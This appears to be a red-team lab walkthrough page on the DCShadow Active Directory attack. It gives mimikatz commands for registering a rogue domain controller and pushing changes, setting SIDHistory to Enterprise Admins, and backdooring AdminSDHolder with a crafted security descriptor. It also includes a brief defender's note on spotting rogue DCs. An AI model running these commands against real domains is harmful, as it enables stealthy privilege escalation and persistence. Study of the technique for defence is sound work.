


<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.2.5">
    
    
      
        <title>DCShadow Attack - Red Team Techniques</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.2d9f7617.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.e6a45f82.min.css">
        
          
          
          <meta name="theme-color" content="#00bdd6">
        
      
    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  


  <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-Y39JH8Q7SV"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-Y39JH8Q7SV",{page_path:e.pathname})})})</script>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y39JH8Q7SV"></script>


    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#dcshadow-attack" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Red Team Techniques" class="md-header__button md-logo" aria-label="Red Team Techniques" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Red Team Techniques
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              DCShadow Attack
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  <li class="md-tabs__item">
    <a href="../../.." class="md-tabs__link">
      Home
    </a>
  </li>

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../Forensics/" class="md-tabs__link">
        Forensics
      </a>
    </li>
  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../" class="md-tabs__link md-tabs__link--active">
        Windows & AD Hacking
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Red Team Techniques" class="md-nav__button md-logo" aria-label="Red Team Techniques" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    Red Team Techniques
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
        
          
            
          
        
          
        
          
        
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../../Forensics/">Forensics</a>
          
            <label for="__nav_2">
              <span class="md-nav__icon md-icon"></span>
            </label>
          
        </div>
      
      <nav class="md-nav" aria-label="Forensics" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Forensics
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/" class="md-nav__link">
        Analyzing Memory Dumps using Volatility
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/" class="md-nav__link">
        Extracting Hashes and Passwords from VMWare Memory Snapshots
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../Forensics/How%20to%20capture%20physical%20memory%20to%20disk/" class="md-nav__link">
        How to capture physical memory to disk
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
      
      
      
        
          
            
          
        
          
        
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../">Windows & AD Hacking</a>
          
            <label for="__nav_3">
              <span class="md-nav__icon md-icon"></span>
            </label>
          
        </div>
      
      <nav class="md-nav" aria-label="Windows & AD Hacking" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Windows & AD Hacking
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
            
              
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" checked>
      
      
      
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      
      
        <label class="md-nav__link" for="__nav_3_2">
          Lab Attacks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Lab Attacks" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_2">
          <span class="md-nav__icon md-icon"></span>
          Lab Attacks
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/" class="md-nav__link">
        Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Constrained%20Delegation%20Abuse/" class="md-nav__link">
        Constrained Delegation Abuse
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
      <a href="./" class="md-nav__link md-nav__link--active">
        DCShadow Attack
      </a>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../JustEnoughAdministration/" class="md-nav__link">
        Just Enough Administration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../LLMNR%20Poisoning/" class="md-nav__link">
        LLMNR Poisoning
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Messing%20with%20Kerberos%20using%20Rubeus/" class="md-nav__link">
        Messing with Kerberos using Rubeus
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Powershell%20AMSI%20Bypass/" class="md-nav__link">
        Powershell AMSI Bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Resource%20Based%20Constrained%20Delegation/" class="md-nav__link">
        Resource Based Constrained Delegation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/" class="md-nav__link">
        Using DCSync attack to steal user hashes in a domain
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" >
      
      
      
        
          
        
          
        
          
        
          
        
          
        
      
      
        <label class="md-nav__link" for="__nav_3_3">
          Lab Creation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Lab Creation" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_3">
          <span class="md-nav__icon md-icon"></span>
          Lab Creation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Lab%20Creation/Art%20of%20Creating%20Machines/" class="md-nav__link">
        Art of Creating Machines
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Lab%20Creation/Child%20Domain%20Lab%20Setup/" class="md-nav__link">
        Child Domain Lab Setup
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/" class="md-nav__link">
        Creating an Active Directory domain
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Lab%20Creation/DCSync%20Lab%20Setup/" class="md-nav__link">
        DCSync Lab Setup
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/" class="md-nav__link">
        Kerberos Constrained Delegation Lab Creation
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
  
                


<h1 id="dcshadow-attack">DCShadow Attack</h1>
<p><img alt="DCShadow%20Attack/Untitled.png" src="Untitled.png" /></p>
<h1 id="explanation">Explanation</h1>
<p>⇒ DCShadow is late-stage kill chain attack that allows an attacker with <strong>SYSTEM</strong> privilege on a machine to register as a rogue domain controller and push changes to a domain. You either need Domain Admin or the following rights to push changes to the domain  :</p>
<ul>
<li>Domain Object :<ul>
<li>DS-Replication-Manage-Topology</li>
<li>DS-Install-Replica</li>
<li>DS-Replication-Synchronize</li>
</ul>
</li>
<li>Site Object :<ul>
<li>CreateChild</li>
<li>DeleteChild</li>
</ul>
</li>
<li>Computer Object ( Rogue DC ) :<ul>
<li>WriteProperty</li>
</ul>
</li>
<li>Target Object :<ul>
<li>WriteProperty</li>
</ul>
</li>
</ul>
<p>⇒ So to set these ACLs there's a powershell script named <strong><a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions</a></strong> which is used to modify AD objects to provide minimal permissions required for DCShadow.</p>
<p>⇒ The reason this attack is great for persistence is because there are no changelogs showed in the event viewer when we modify an object ACL which is great to hide our tracks 🙂 .</p>
<hr />
<h1 id="performing-the-attack">Performing The Attack</h1>
<hr />
<h2 id="prerequisites">Prerequisites</h2>
<ul>
<li><strong>SYSTEM</strong> on a machine</li>
<li><strong>Domain Admin</strong> account</li>
<li><strong><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></strong></li>
</ul>
<hr />
<h2 id="modifying-an-object-attribute">Modifying an object attribute</h2>
<p>⇒ First lets get mimikatz fired up for the attack :</p>
<ul>
<li>[ SYSTEM ]</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%201.png" src="Untitled%201.png" /></p>
<ul>
<li>[ Domain Administrator ]</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%202.png" src="Untitled%202.png" /></p>
<p>⇒ So next we will be modifying an user's object description attribute :</p>
<ul>
<li>[System]</li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /object:test1 /attribute:Description /value=&quot;DCShadow works eh&quot;
</code></pre>
<p><img alt="DCShadow%20Attack/Untitled%203.png" src="Untitled%203.png" /></p>
<ul>
<li>[Domain Admin]</li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /push
</code></pre>
<p><img alt="DCShadow%20Attack/Untitled%204.png" src="Untitled%204.png" /></p>
<ul>
<li>Checking the user description with <strong>PowerView</strong> to confirm we did modify user description attribute :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%205.png" src="Untitled%205.png" /></p>
<h3 id="defenders-perspective">⇒ Defender's perspective :</h3>
<ul>
<li>Taking a look at Event Viewer in vDC01 ( Domain Controller ) to check for change logs :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%206.png" src="Untitled%206.png" /></p>
<ul>
<li>The only changelog here is the one showed in the screenshot, but doesn't show any logs that says we modified test1 object attribute.</li>
<li>Although we do notice the following GUID [ <strong><code>E3514235–4B06–11D1-AB04–00C04FC2DCD2</code></strong> ] in the above changelog which basically signifies that this machine is a Domain Controller :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%207.png" src="Untitled%207.png" /></p>
<ul>
<li>So as a defender if u see an machine being assigned the following <strong>GUID</strong> and is not in the <strong>Domain Controller Organizational Unit</strong>, it is more likely an rogue domain controller.</li>
</ul>
<hr />
<h2 id="performing-dcshadow-with-minimal-permissions">Performing DCShadow with minimal permissions</h2>
<p>⇒ So in this example we won't be needing domain admin to push changes to the domain. We will be giving the minimal permissions needed using <strong><a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions.ps1</a> :</strong></p>
<ul>
<li>So we will be giving permissions to user <strong>naqi</strong> to modify <strong>test1</strong> object from machine <strong>IIS01</strong></li>
</ul>
<pre><code class="language-powershell">Set-DCShadowPermissions -FakeDC IIS01 -SAMAccountName test1 -Username naqi -Verbose
</code></pre>
<p><img alt="DCShadow%20Attack/Untitled%208.png" src="Untitled%208.png" /></p>
<p>⇒ Firing up <strong><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></strong> as <strong>SYSTEM</strong> and <strong>Naqi</strong> :</p>
<p><img alt="DCShadow%20Attack/Untitled%209.png" src="Untitled%209.png" /></p>
<ul>
<li>[ <strong>SYSTEM</strong> ]</li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /object:test1 /attribute:Description /value=&quot;Noice m8&quot;
</code></pre>
<ul>
<li>[ <strong>NAQI</strong> ]</li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /push
</code></pre>
<p><img alt="DCShadow%20Attack/Untitled%2010.png" src="Untitled%2010.png" /></p>
<ul>
<li>Confirming the changes using PowerView :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%2011.png" src="Untitled%2011.png" /></p>
<hr />
<h2 id="setting-sidhistory">Setting SIDHistory</h2>
<p>⇒  SID History enables access for another account to effectively be cloned to another this is useful to ensure users retain access when migrating to different domain . </p>
<p>⇒ We can set <strong>SIDHistory</strong> of an user account to <strong>Domain Admin / Enterprise Admin</strong> group <strong>SID</strong> which would give the user the privileges of the group we set in the <strong>SIDHistory</strong>. </p>
<p>⇒ The reason this is much better than just adding a user to the group directly is :</p>
<ul>
<li><strong>SIDHistory</strong> works for SIDs in the same domain as it does across domains in the same forest</li>
<li>It is more sneaky and not so easy to spot as compared to modifying <strong>primaryGroupID</strong> attribute.</li>
</ul>
<p>⇒ We will be modifying the <strong>SIDHistory</strong> attribute for the user <strong>test1</strong> to <strong>Enterprise Admin</strong> group <strong>SID</strong> which is :</p>
<p><img alt="DCShadow%20Attack/Untitled%2012.png" src="Untitled%2012.png" /></p>
<ul>
<li>Lets get root domain <strong>SID</strong> and add <strong><code>-519</code></strong> to it , which will be Enterprise Admins group <strong>SID</strong> :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%2013.png" src="Untitled%2013.png" /></p>
<p>Enterprise Admins : <strong><code>S-1-5-21-1710056623-765944083-1957563412-519</code></strong></p>
<ul>
<li>Next lets fire up <strong>mimikatz</strong> :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%2014.png" src="Untitled%2014.png" /></p>
<ul>
<li>[ <strong>SYSTEM</strong> ]</li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /object:test1 /attribute:SIDHistory /value:S-1-5-21-1710056623-765944083-1957563412-519
</code></pre>
<ul>
<li>[ <strong>NAQI</strong> ]</li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /push
</code></pre>
<p><img alt="DCShadow%20Attack/Untitled%2015.png" src="Untitled%2015.png" /></p>
<ul>
<li>Confirming the changes using <strong>PowerView</strong> :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%2016.png" src="Untitled%2016.png" /></p>
<hr />
<h2 id="adminsdholder">AdminSDHolder</h2>
<p>⇒ <strong>AdminSDHolder</strong> is a container in AD that holds the Security Descriptor applied to members of protected groups.</p>
<ul>
<li>
<p><strong>AdminSDHolder</strong> container can be abused by backdooring it by giving your user <strong>GenericAll</strong> privileges, which effectively makes that user a <strong>Domain Admin.</strong></p>
</li>
<li>
<p>First we will enumerate the current <strong>ACLs</strong> for <strong>AdminSDHolder</strong></p>
</li>
</ul>
<pre><code class="language-powershell">(New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://CN=AdminSDHolder,CN=System,DC=endark,DC=local&quot;)).psbase.ObjectSecurity.sddl
</code></pre>
<p><img alt="DCShadow%20Attack/Untitled%2017.png" src="Untitled%2017.png" /></p>
<p><strong><code>(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;&lt;USERSID&gt;)</code></strong></p>
<ul>
<li>Now lets grab our user <strong>SID</strong> :</li>
</ul>
<p><img alt="DCShadow%20Attack/Untitled%2018.png" src="Untitled%2018.png" /></p>
<p><strong><code>(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118)</code></strong></p>
<p>⇒ Next we will fire up <strong>mimikatz</strong> :</p>
<p><img alt="DCShadow%20Attack/Untitled%2019.png" src="Untitled%2019.png" /></p>
<p>⇒ We will be modifying the <strong>ntSecurityDescriptor</strong> attribute to add our <strong>ACL</strong> to it :</p>
<ul>
<li><strong>[ SYSTEM ]</strong></li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=endark,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)**(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118)**
</code></pre>
<ul>
<li>[ <strong>Domain Admin</strong> ]</li>
</ul>
<pre><code class="language-powershell">lsadump::dcshadow /push
</code></pre>
<p><img alt="DCShadow%20Attack/Untitled%2020.png" src="Untitled%2020.png" /></p>
<p>⇒ We see that the user <strong>test1</strong> has the following rights on <strong>AdminSDHolder</strong> container :</p>
<p><img alt="DCShadow%20Attack/Untitled%2021.png" src="Untitled%2021.png" /></p>
<hr />
<p>References : <a href="https://adsecurity.org/?p=1772">https://adsecurity.org/?p=1772</a> , <a href="https://www.youtube.com/watch?v=ZPsC_DkR_PI">https://www.youtube.com/watch?v=ZPsC_DkR_PI</a> , <a href="https://adsecurity.org/?p=1906">https://adsecurity.org/?p=1906</a></p>

              

  <!-- Giscus -->
  <h2 id="__comments">Comments</h2>
  <!-- Replace with generated snippet -->
  <script src="https://giscus.app/client.js"
  data-repo="redteamtechniques/redteamtechniques.github.io"
  data-repo-id="R_kgDOHCc7xQ"
  data-category="General"
  data-category-id="DIC_kwDOHCc7xc4COM2i"
  data-mapping="title"
  data-reactions-enabled="1"
  data-emit-metadata="0"
  data-input-position="bottom"
  data-theme="transparent_dark"
  data-lang="en"
  crossorigin="anonymous"
  async>
</script>
  <!-- Reload on palette change -->
  <script>
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object")
      if (palette.color.scheme === "slate") {
        var giscus = document.querySelector("script[src*=giscus]")
        giscus.setAttribute("data-theme", "dark") 
      }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>

            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../Constrained%20Delegation%20Abuse/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Constrained Delegation Abuse" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Constrained Delegation Abuse
            </div>
          </div>
        </a>
      
      
        
        <a href="../JustEnoughAdministration/" class="md-footer__link md-footer__link--next" aria-label="Next: Just Enough Administration" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Just Enough Administration
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.indexes"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script>
    
    
      <script src="../../../assets/javascripts/bundle.467223ff.min.js"></script>
      
    
  </body>
</html>